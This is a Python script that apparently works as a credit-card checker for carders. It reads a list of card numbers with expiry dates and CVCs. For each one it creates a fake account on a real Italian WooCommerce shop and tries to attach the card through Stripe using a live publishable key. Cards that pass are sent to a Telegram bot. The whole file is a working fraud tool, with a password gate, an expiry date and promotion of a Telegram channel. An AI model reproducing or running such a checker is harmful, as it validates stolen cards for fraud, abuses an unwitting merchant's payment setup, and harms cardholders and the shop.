import requests
import re
import time
import random
import re,json
import string
import base64
from bs4 import BeautifulSoup
import user_agent
import pyfiglet ##Fucking Bitch Decode 🖕🖕
import os
import webbrowser
from colorama import Fore
from getuseragent import UserAgent
from tqdm import tqdm
from rich.panel import Panel
from rich import print as PR
import webbrowser
sifre = '@HQCharge'
pss = input('\x1b[1;32m PASSWORD : ')
import sys,time,os
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()
lo(" \x1b[1;36m  『𝐆𝐒𝐈𝐗』ꪜ ᵒʷⁿᵉʳ𓆪ꪾ 𝐖𝐚𝐢𝐭 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝  ")
os.system('clear')            
#print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")   
       
   
if pss == sifre:
    print('\x1b[1;32m⠀⠀  \n\n    SUCCESS ✅     \n     \n  ')
    time.sleep(2)
    os.system('clear')
else:
    sys.exit('\x1b[1;31m           Try Again ❌ ')
for x in tqdm(range(100),total=100,colour='blue',desc="Progress"):
	time.sleep(0.03)
os.system('clear')
from datetime import datetime


expiration_date = datetime(2024, 10, 25, 11, 59)

webbrowser.open('https://t.me/CHITNGE54')
current_date = datetime.now()
D = '\033[2;32m'
E = '\033[2;31m'
E = '\033[2;33m'
E = '\033[2;34m'
R = '\033[2;31m'
B = '\033[2;35m'
Lb = '\033[1;33m'
W =  '\033[1;37m'
color = Fore.BLUE
color1 = Fore.GREEN
color2 = Fore.RED
color3 = Fore.YELLOW
color4 = Fore.MAGENTA
color5 = Fore.CYAN
blue=Fore.BLUE;green=Fore.LIGHTGREEN_EX;red=Fore.RED;white=Fore.WHITE;yellow=Fore.YELLOW;black=Fore.BLACK;light_blue=Fore.LIGHTBLUE_EX;purble=Fore.LIGHTMAGENTA_EX;Baby_Blue=Fore.LIGHTCYAN_EX
os.system("clear")
Text = """\n Gateway : Stripe \t Dev : 『ᝯׁhׁׅ֮ꪱׁׅtׁׅꪀׁׅᧁׁꫀׁׅܻ 』【𝐂𝐇】ᶜⁿꪜ 💤 \n Amount : none\t \t OWNER : @Ownerxxxxx\n Type : Auth \t\t Channel : https://t.me/CHITNGE54"""
width = 70
title_length = len("~> | Details | <~            ")
padding = (width - title_length) // 2
title_padded = " " * padding + "~> | Details | <~                   " + " " * (width - title_length - padding)
PR(Panel(Text, width=width, title=title_padded, style="bold", border_style="underline", title_align="center"))
print("GSIX")
if current_date > expiration_date:
    print("𝗧𝗵𝗶𝘀 𝘀𝗰𝗿𝗶𝗽𝘁 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗮𝗻𝗱 𝘄𝗶𝗹𝗹 𝗻𝗼 𝗹𝗼𝗻𝗴𝗲𝗿 𝗿𝘂𝗻. \n 𝐎𝐰𝐧𝐞𝐫 𝐡𝐚𝐬 𝐜𝐥𝐨𝐬𝐞𝐝 𝐭𝐡𝐞 𝐟𝐢𝐥𝐞!  𝐂𝐨𝐧𝐭𝐚𝐜𝐭 @Ownerxxxxx TO 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐚𝐜𝐜𝐞𝐬𝐬")
    exit()  # Exits the program
start = 0
path = input(Lb+"CC COMBO NAME : "+B)
ID = input(E+"ENTER YOUR TG ID : ")
token = input(R+"ENTER BOT TOKEN : "+D)
with open(path) as file:
				lino = file.readlines()
				lino = [line.rstrip() for line in lino]
for e in lino:
	ccx = e.strip().split('\n')[0]
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
					
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
				
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
					
		return f"{name}{number}"
	username = (username())
				
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
				
	corr = generate_random_code()
				
	sess = generate_random_code()
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
				
	headers = {
	    'user-agent': user,
	}
	
	data = {
	    'email': acc,
	    'password': 'ASDzxc#123#',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_session_entry': 'https://purpleprofessionalitalia.it/my-account/',
	    'wc_order_attribution_session_start_time': '2024-10-17 14:07:30',
	    'wc_order_attribution_session_pages': '2',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'mailchimp_woocommerce_newsletter': '1',
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Registrati',
	}
	
	response = r.post('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://purpleprofessionalitalia.it/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	
	
	headers = {
	    'user-agent': user,
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=iegeodftomeppqjdgk%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NGkNqLqrv9VwaLxkKg6NxZWrX6UGN6mRkVNuvXXVzVepSrskeWwFwR3ExA8QOVeFCC1kBW5yQomPrJp44akaqxV00Dj7dk5cN'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	if not 'id' in response.json():
		print('ERORR CARD')
	else:
		id=response.json()['id']
	
	headers = {
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	response = r.post('https://purpleprofessionalitalia.it/', params=params, cookies=r.cookies, headers=headers, data=data)
	msg=response.text
	if 'success' in msg:
	    print(Fore.GREEN+f" CC : {ccx} \n Response : Approved ✅ \n STRIPE SOURCE ID : {id} \n Dev : @Ownerxxxxx ")
	    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&parse_mode=HTML&text=<b>APPROVED  ✅\n \n⌧ CC : <code>{ccx}</code>\n⌧ GATES : Stripe Auth\n⌧ STRIPE SOURCE ID : <code>{id}</code>\n⌧ Response : Success 🟢\n \n⌧ CHK BY⇾ <a href='tg://user?id=6191863486'>『ᝯׁhׁׅ֮ꪱׁׅtׁׅꪀׁׅᧁׁꫀׁׅܻ 』【𝐂𝐇】ᶜⁿꪜ</a></b>")

    	
	else:
		print(Fore.RED+f" CC : {ccx} \n Response : Your Card Was Declined. ❌ \n STRIPE SOURCE ID : {id} \n Dev : @Ownerxxxxx ")
